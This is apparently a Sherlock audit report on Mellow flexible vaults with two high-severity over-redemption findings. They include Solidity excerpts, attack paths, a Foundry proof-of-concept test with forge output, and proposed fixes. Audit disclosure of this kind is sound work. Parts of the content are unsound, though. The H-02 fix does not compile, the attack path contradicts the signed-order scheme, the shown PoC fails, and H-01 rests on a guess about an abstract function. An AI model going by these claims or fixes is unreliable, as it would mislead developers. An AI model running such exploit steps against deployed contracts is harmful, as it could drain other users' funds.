### [H-01] Over-Redeem in redeem() Function Allows Users to Drain Vault Funds

_Severity:_ High

_Source:_ https://github.com/sherlock-audit/2025-07-mellow-flexible-vaults-Yahaya-Salisu/blob/main/flexible-vaults%2Fsrc%2Fqueues%2FRedeemQueue.sol#L87-L125

### Summary
The `redeem()` function does not validate whether the caller owns enough shares before burning them. It immediately calls `shareManager_.burn(caller, shares);` without checking the user’s share balance.

And the `burn()` function is expected to handle this check internally since the `redeem()` fails to do, but it also forwards the call to `_burnShares()` which is an unimplemented virtual function in the provided code, this means that there's no safeguard that checks the caller's balance before burn. And his allows an attacker to redeem more shares than owned and potentially drain the funds.

```solidity
    /// @inheritdoc IRedeemQueue
    function redeem(uint256 shares) external nonReentrant {
        if (shares == 0) {
            revert ZeroValue();
        }
        address caller = _msgSender();

        address vault_ = vault();
        if (IShareModule(vault_).isPausedQueue(address(this))) {
            revert QueuePaused();
        }
        IShareManager shareManager_ = IShareManager(IShareModule(vault_).shareManager());

      // ⚠️ BUG: there's no check to verify if the caller owns enough shares before burning them
        shareManager_.burn(caller, shares);
        {
            IFeeManager feeManager = IShareModule(vault_).feeManager();
            uint256 fees = feeManager.calculateRedeemFee(shares);
            if (fees > 0) {
                shareManager_.mint(feeManager.feeRecipient(), fees);
                shares -= fees;
            }
        }
       ...
    }
```

The burn function also does not check if caller shares balance is enough.

```solidity
// ShareManager.sol

    /// @inheritdoc IShareManager
    function burn(address account, uint256 value) external onlyQueue {
        if (value == 0) {
            revert ZeroValue();
        }
        _burnShares(account, value);
        emit Burn(account, value);
    }
```

### Internal Preconditions
1. The `redeem()` and `burn()` do not perform balance check.

2. And the `_burnShares()` is left abstract, so there's no guarantee if it performs this validation.


### External Preconditions
1. Attacker owns a small amount of shares e.g 1 shares.

2. Attacker calls `redeem(10,000)` to redeem shares they do not own.


### Attacker Path
1. Attacker deposits a small amount of assets and receives 1 share for example.

2. Then calls `redeem(10_000)` or any large number of shares.

3. Vault proceeds with the redemption logic, calculate and deducts fees, and sent the request to the `redeem queue`, and once the request is completed, the attacker will claim the funds more than deserved.


### Impact
This issue allows a user to redeem more than their actual share balance, leading to potential total protocol drain and complete loss of users funds if attacker redeems repeatedly, and loss of trust in the system's integrity and accounting, and unauthorized extraction of vault assets.


## PoC
The protocol team forgot to add `RedeemQueue.t.sol` file in the repository, so, the full on-chain PoC is not possible for me.

But, the vulnerability can be triggered by calling `redeem()` with an amount greater than the caller's actual share balance, and the `burn()` function called inside `redeem()` and delegates to `_burnShares()` which is not implemented in this contract, allowing the redemption to succeed without verifying the caller’s balance, and this allows any user to drain funds by repeatedly redeeming more than they own.


### Recommendation:
Make sure to check if the caller owns enough shares before burning
```solidity
    /// @inheritdoc IRedeemQueue
    function redeem(uint256 shares) external nonReentrant {
        if (shares == 0) {
            revert ZeroValue();
        }
        address caller = _msgSender();

        address vault_ = vault();
        if (IShareModule(vault_).isPausedQueue(address(this))) {
            revert QueuePaused();
        }
        IShareManager shareManager_ = IShareManager(IShareModule(vault_).shareManager());

      // make sure user owns enough shares before burn
        if (shareManager_.balanceOf(caller) < shares) revert InsufficientBalance();
        shareManager_.burn(caller, shares);
        {
            IFeeManager feeManager = IShareModule(vault_).feeManager();
            uint256 fees = feeManager.calculateRedeemFee(shares);
            if (fees > 0) {
                shareManager_.mint(feeManager.feeRecipient(), fees);
                shares -= fees;
            }
        }
            ...
    }
```



### [H-02] Missing requested amount validation allows over-redeem in redeem() function

_Severity:_ High

_Source:_ https://github.com/sherlock-audit/2025-07-mellow-flexible-vaults-Yahaya-Salisu/blob/main/flexible-vaults%2Fsrc%2Fqueues%2FSignatureRedeemQueue.sol#L13-L28


### Summary
The `redeem()` function in `signatureRedeemQueue.sol` extents `signatureQueue` to enable instant share redemption from a vault without the usual delay of on-chain oracle processing.

The function calls `validateOrder()` and both of the functions do not check if the `requested > ordered`, meaning that if a user calls `redeem()` with a requested amount that exceeds ordered amount, the redemption will still proceed even if the `requested > ordered`, this allows users to potentially drain the vaults

```solidity
    function redeem(Order calldata order, IConsensus.Signature[] calldata signatures) external payable nonReentrant {
        validateOrder(order, signatures);
        _signatureQueueStorage().nonces[order.caller]++;
        IShareModule vault_ = IShareModule(vault());

  // ⚠️ BUG: there's no check to ensure requested <= ordered
        if (order.requested > vault_.getLiquidAssets()) {
            revert InsufficientAssets(order.requested, vault_.getLiquidAssets());
        }

// burns the shares without checking if requested > ordered
        vault_.shareManager().burn(order.recipient, order.ordered);

           ...

        emit OrderExecuted(order, signatures);
    }
```

This bug is similar in nature to `[H-01]` found in `RedeemQueue.sol`, but due to the separation of contract logic and exploit surface, this report addresses a distinct instance.

### Root Cause
SignatureRedeemQueue.sol#L13-L28 https://github.com/sherlock-audit/2025-07-mellow-flexible-vaults-Yahaya-Salisu/blob/main/flexible-vaults%2Fsrc%2Fqueues%2FSignatureRedeemQueue.sol#L13-L28

### Internal Pre-conditions
1. If a trusted admin or validator has signed a message granting a user an ordered amount, which can be redeemed via `SignatureRedeemQueue.redeem()`.

### External Pre-conditions
1. A user has to get signed ordered amount first and then calls `redeem()` with a `requested > ordered`.

### Attack Path
1. A user got a valid signed order for `1,000`.

2. And then modifies requested amount to `1,010` even though the signed ordered is `1000`.

3. And the user calls `redeem()` with valid signatures and redemption succeeds as long as vault has >= 1,010 in liquid assets.

### Impact
1. This vulnerability allows a user to redeem more assets than they are allowed to redeem, and inflating their authorized withdrawal by exploiting a missing requested validation.

2. And this leads to permanent imbalance in the vault, dilution of shares, and potential loss of funds for other users.

### PoC
The PoC below shows how a user got signed ordered of 1,000 and calls redeem with a `requested > ordered`, but the transaction fails due to InsufficientAsset in the vault.

If the vault has sufficientAsset, the user can redeem requested amount even though `requested > ordered`.

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.25;

import "../../Fixture.t.sol";
import "../../Imports.sol";
import "forge-std/console.sol";

contract SignatureRedeemQueueTest is FixtureTest {
    address vaultAdmin = vm.createWallet("vaultAdmin").addr;
    address vaultProxyAdmin = vm.createWallet("vaultProxyAdmin").addr;
    address user = vm.createWallet("user").addr;
    address asset;
    address[] assetsDefault;

    function setUp() external {
        asset = address(new MockERC20());
        assetsDefault.push(asset);
    }

    function testRedeem() external {
        Deployment memory deployment = createVault(vaultAdmin, vaultProxyAdmin, assetsDefault);

        uint256 signerPk = uint256(keccak256("signer"));
        address signer = vm.addr(signerPk);
        address[] memory signers = new address[](1);
        signers[0] = signer;
        (Consensus consensus,) = createConsensus(deployment, signers);
        SignatureRedeemQueue queue =
            SignatureRedeemQueue(addSignatureRedeemQueue(deployment, vaultProxyAdmin, asset, address(consensus)));

        uint256 amount = 1000;
        uint256 requested = 1000 + 10;

        ISignatureQueue.Order memory order = ISignatureQueue.Order({
            orderId: 1,
            queue: address(queue),
            asset: asset,
            caller: user,
            recipient: user,
            ordered: amount,
            requested: requested,
            deadline: block.timestamp + 1 days,
            nonce: 0
        });
        IConsensus.Signature[] memory signatures = new IConsensus.Signature[](1);
        signatures[0] = signOrder(queue, order, signerPk);
        {
            Oracle oracle = deployment.oracle;
            IOracle.Report[] memory reports = new IOracle.Report[](1);
            uint224 price = 1e18;
            reports[0] = IOracle.Report({asset: asset, priceD18: price});
            vm.startPrank(vaultAdmin);
            oracle.submitReports(reports);
            oracle.acceptReport(asset, price, uint32(block.timestamp));
            vm.stopPrank();
        }

        vm.prank(address(queue));
        deployment.shareManager.mint(user, amount);
        MockERC20(asset).mint(address(deployment.vault), amount);
        
        console.log("Vault token balance:", MockERC20(asset).balanceOf(address(deployment.vault)));
        console.log("Requested:", order.requested);
        console.log("Ordered:", order.ordered);

        vm.prank(user);
        queue.redeem(order, signatures);

        assertEq(MockERC20(asset).balanceOf(user), requested, "User should receive assets");
    }

    function signOrder(SignatureQueue queue, ISignatureQueue.Order memory order, uint256 pk)
        internal
        view
        returns (IConsensus.Signature memory)
    {
        bytes32 hash = queue.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);
        return IConsensus.Signature({signer: vm.addr(pk), signature: abi.encodePacked(r, s, v)});
    }
}
```


Run test with
```bash
forge test --fork-url $(grep ETH_RPC .env | cut -d '=' -f2) --gas-limit 10000000000000000 --fork-block-number 22730425 -vvv --match-path './test/unit/queues/SignatureRedeemQueueTest.t.sol'
```

Test Output
![PoC](https://github.com/user-attachments/assets/f9bc1703-a3b6-419e-82b7-b4e27809b55f)

```bash
$ forge test --fork-url $(grep ETH_RPC .env | cut -d '=' -f2) --gas-limit 10000000000000000 --fork-block-number 22730425 -vvv --match-path './test/unit/queues/SignatureRedeemQueueTest.t.sol'
[⠘] Compiling...
[⠑] Compiling 1 files with Solc 0.8.25
[⠃] Solc 0.8.25 finished in 49.63s
Compiler run successful!

Ran 2 tests for test/unit/queues/SignatureRedeemQueueTest.t.sol:SignatureRedeemQueueTest
[PASS] test() (gas: 185)
[FAIL: InsufficientAssets(1010, 1000)] testRedeem() (gas: 39807988)
Logs:
  Vault token balance: 1000
  Requested: 1010
  Ordered: 1000

Traces:
  [39807988] SignatureRedeemQueueTest::testRedeem()

                               ...

    │   └─ ← [Revert] InsufficientAssets(1010, 1000)
    │   └─ ← [Revert] InsufficientAssets(1010, 1000)
    └─ ← [Revert] InsufficientAssets(1010, 1000)

Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 39.77ms (31.57ms CPU time)

Ran 1 test suite in 4.12s (39.77ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests:
Encountered 1 failing test in test/unit/queues/SignatureRedeemQueueTest.t.sol:SignatureRedeemQueueTest
[FAIL: InsufficientAssets(1010, 1000)] testRedeem() (gas: 39807988)

Encountered a total of 1 failing tests, 1 tests succeeded
```

### Mitigation

```solidity
    function redeem(Order calldata order, IConsensus.Signature[] calldata signatures) external payable nonReentrant {
        validateOrder(order, signatures);
        _signatureQueueStorage().nonces[order.caller]++;
        IShareModule vault_ = IShareModule(vault());

// FIX: after checking vault liquidAsset, check if requested > ordered 
        if (order.requested > vault_.getLiquidAssets(), || order.requested > order.ordered) {
            revert InsufficientAssets(order.requested, vault_.getLiquidAssets());
        }

        vault_.shareManager().burn(order.recipient, order.ordered);
      ...
        emit OrderExecuted(order, signatures);
    }
```
